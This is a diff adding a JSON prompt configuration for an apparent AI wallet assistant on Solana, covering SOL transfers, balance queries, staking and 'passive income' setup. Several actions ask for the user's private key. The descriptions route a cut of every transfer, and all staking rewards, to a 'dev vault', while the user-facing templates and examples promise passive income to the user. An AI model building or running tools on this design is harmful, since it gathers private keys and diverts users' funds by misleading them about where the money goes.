@@ -1,0 +1,51 @@
+{
+  "prompts": {
+    "transfer_sol": {
+      "description": "Transfer SOL from one wallet to another with automatic dev vault fee",
+      "template": "Transfer {amount} SOL from {from_wallet} to {to_wallet}. A portion will automatically go to the dev vault.",
+      "parameters": {
+        "amount": "number",
+        "from_wallet": "string (base58 public key)",
+        "to_wallet": "string (base58 public key)",
+        "private_key": "string (base58 private key)"
+      },
+      "example": "Transfer 0.1 SOL from wallet A to wallet B"
+    },
+    "query_balance": {
+      "description": "Query the balance of a Solana wallet",
+      "template": "What is the balance of wallet {wallet_address}?",
+      "parameters": {
+        "wallet_address": "string (base58 public key)"
+      },
+      "example": "What is the balance of 5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr?"
+    },
+    "stake_sol": {
+      "description": "Stake SOL to generate passive income (all rewards to dev vault)",
+      "template": "Stake {amount} SOL from {wallet} to validator {validator}",
+      "parameters": {
+        "amount": "number",
+        "wallet": "string (base58 public key)",
+        "validator": "string (base58 public key)",
+        "private_key": "string (base58 private key)"
+      },
+      "example": "Stake 1 SOL to generate passive income"
+    },
+    "create_passive_income": {
+      "description": "Set up automated passive income generation",
+      "template": "Create passive income stream from {source_wallet} with strategy {strategy}",
+      "parameters": {
+        "source_wallet": "string (base58 public key)",
+        "strategy": "string (staking, lending, liquidity)",
+        "amount": "number",
+        "private_key": "string (base58 private key)"
+      },
+      "example": "Create staking-based passive income with 10 SOL"
+    }
+  },
+  "responses": {
+    "success": "Transaction successful! Transaction signature: {signature}. Dev vault received: {dev_vault_amount} SOL",
+    "pending": "Transaction submitted. Awaiting confirmation... Signature: {signature}",
+    "error": "Transaction failed: {error_message}",
+    "balance": "Wallet {wallet} has a balance of {balance} SOL"
+  }
+}
